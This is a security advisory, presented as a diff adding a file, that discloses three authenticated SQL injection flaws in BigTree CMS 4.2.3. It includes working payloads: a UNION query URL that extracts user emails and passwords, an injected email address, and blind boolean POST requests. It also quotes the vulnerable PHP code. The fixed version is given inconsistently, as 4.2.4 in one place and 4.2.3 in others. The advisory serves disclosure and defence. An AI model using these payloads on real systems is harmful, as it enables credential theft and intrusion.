@@ -1,0 +1,158 @@
+BigTree CMS 4.2.3: Multiple SQL Injection Vulnerabilities
+Security Advisory – Curesec Research Team
+
+Online-Reference:
+http://blog.curesec.com/article/blog/BigTree-CMS-423-Multiple-SQL-Injection-Vulnerabilities-39.html
+
+1. Introduction
+
+Affected Product:   BigTree CMS 4.2.3  
+Fixed in:     4.2.4
+Fixed Version Link:
+https://github.com/bigtreecms/BigTree-CMS/archive/4.2.3.zip  
+Vendor Contact:   contribute@bigtreecms.org  
+Vulnerability Type:   Multiple SQL Injections  
+Remote Exploitable:   Yes  
+Reported to vendor:   07/07/2015  
+Disclosed to public:   08/07/2015  
+Release mode:     Coordinated release  
+CVE:       n/a  
+Credits     Tim Coen of Curesec GmbH  
+
+2. Vulnerability Description
+
+Various components of the admin area of the BigTree CMS are vulnerable
+to SQL injection, which can lead to data leaks as well as compromisation
+of the host.
+
+Please note that you have to be authenticated to exploit this issue.
+
+SQL Injection 1
+
+The script that processes page view requests passes the "id" GET request
+value to functions which put this value directly into SQL queries. No
+prepared statements or escaping is used, thus opening it up to SQL
+injection.
+
+Proof of Concept (Show all BigTree users):
+
+
+http://localhost//BigTree-CMS/site/index.php/admin/pages/view-tree/0'
+union all select 1,concat(email, ":", password),3,4,5,6,7,8,9,10 from
+bigtree_users %23/
+
+Code:
+
+        core/admin/modules/pages/view-tree.php:151; page id is user
+controlled
+          $nav_visible =
+array_merge($admin->getNaturalNavigationByParent($page["id"],1),$admin->getPendingNavigationByParent($page["id"]));
+          $nav_hidden =
+array_merge($admin->getHiddenNavigationByParent($page["id"]),$admin->getPendingNavigationByParent($page["id"],""));
+          $nav_archived = $admin->getArchivedNavigationByParent($page["id"]);
+
+        core/inc/bigtree/admin.php:2638
+        static function getArchivedNavigationByParent($parent) {
+                [...]
+          $q = sqlquery("SELECT id,nav_title as
+title,parent,external,new_window,template,publish_at,expire_at,path,ga_page_views
+FROM bigtree_pages WHERE parent = '$parent' AND archived = 'on' ORDER BY
+nav_title asc");
+
+        core/inc/bigtree/admin.php:3167
+        static function getHiddenNavigationByParent($parent) {
+                [...]
+          $q = sqlquery("SELECT id,nav_title as
+title,parent,external,new_window,template,publish_at,expire_at,path,ga_page_views
+FROM bigtree_pages WHERE parent = '$parent' AND in_nav = '' AND archived
+!= 'on' ORDER BY nav_title asc");
+
+        core/inc/bigtree/admin.php:3758
+        static function getNaturalNavigationByParent($parent,$levels = 1) {
+                [...]
+          $q = sqlquery("SELECT id,nav_title AS
+title,parent,external,new_window,template,publish_at,expire_at,path,ga_page_views
+FROM bigtree_pages WHERE parent = '$parent' AND in_nav = 'on' AND
+archived != 'on' ORDER BY position DESC, id ASC");
+
+        core/inc/bigtree/admin.php:4531
+        static function getPendingNavigationByParent($parent,$in_nav = true) {
+                [...]
+          $q = sqlquery("SELECT * FROM bigtree_pending_changes WHERE
+pending_page_parent = '$parent' AND `table` = 'bigtree_pages' AND type =
+'NEW' ORDER BY date DESC");
+
+SQL Injection 2
+
+When creating a new user, the email address is not checked server side,
+so it is possible to set it to anything.
+
+When logging in, the email address is saved in the session, and later
+used to retrieve user data. This happens without prepared statements,
+thus opening the query up to SQL injection.
+
+Proof of Concept:
+
+
+1. Create User
+f'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10%23bar@example.com
+2. Log in
+3. result can be seen in multiple places
+
+Code:
+
+    core/inc/bigtree/admin.php:81
+        $f = sqlfetch(sqlquery("SELECT * FROM bigtree_users WHERE id =
+'".$_SESSION["bigtree_admin"]["id"]."' AND email =
+'".$_SESSION["bigtree_admin"]["email"]."'"));
+
+SQL Injection 3 (Blind)
+
+The function used to calculate the SEO score of a post for Ajax requests
+passes unsanitized user input to a function performing the actual
+computation. This function does not use prepared statements, thus
+opening it up to SQL injection. The result of the query is never echoed
+to the end user, making this a blind SQL injection.
+
+Proof of Concept:
+
+
+
+http://localhost//BigTree-CMS/site/index.php/admin/ajax/pages/get-seo-score
+        POST: content=foo&resources=bar&id=foo' or 1=2%23&title=Trees of
+All Sizes
+
+
+http://localhost//BigTree-CMS/site/index.php/admin/ajax/pages/get-seo-score
+        POST: content=foo&resources=bar&id=foo' or 1=1%23&title=Trees of
+All Sizes
+
+Code:
+
+        core/admin/ajax/pages/get-seo-score.php:4:  
+            $seo = $admin->getPageSEORating($_POST,$_POST["resources"]);
+
+        core/inc/bigtree/admin.php:4222
+            static function getPageSEORating($page,$content) {
+                    [...]
+              if ($page["title"]) {
+                $score += 5;
+                // They have a title, let's see if it's unique
+                $r = sqlrows(sqlquery("SELECT * FROM bigtree_pages WHERE
+title = '".sqlescape($page["title"])."' AND id != '".$page["id"]."'"));
+
+3. Solution
+
+To mitigate this issue please upgrade at least to version 4.2.3:
+
+https://github.com/bigtreecms/BigTree-CMS/archive/4.2.3.zip
+
+Please note that a newer version might already be available.
+
+4. Report Timeline
+
+07/07/2015   Informed Vendor about Issue
+07/08/2015   Vendor send Fixes for confirmation
+07/10/2015   Fixes Confirmed
+07/26/2015   Vendor releases Version 4.2.3
+08/07/2015   Disclosed to public
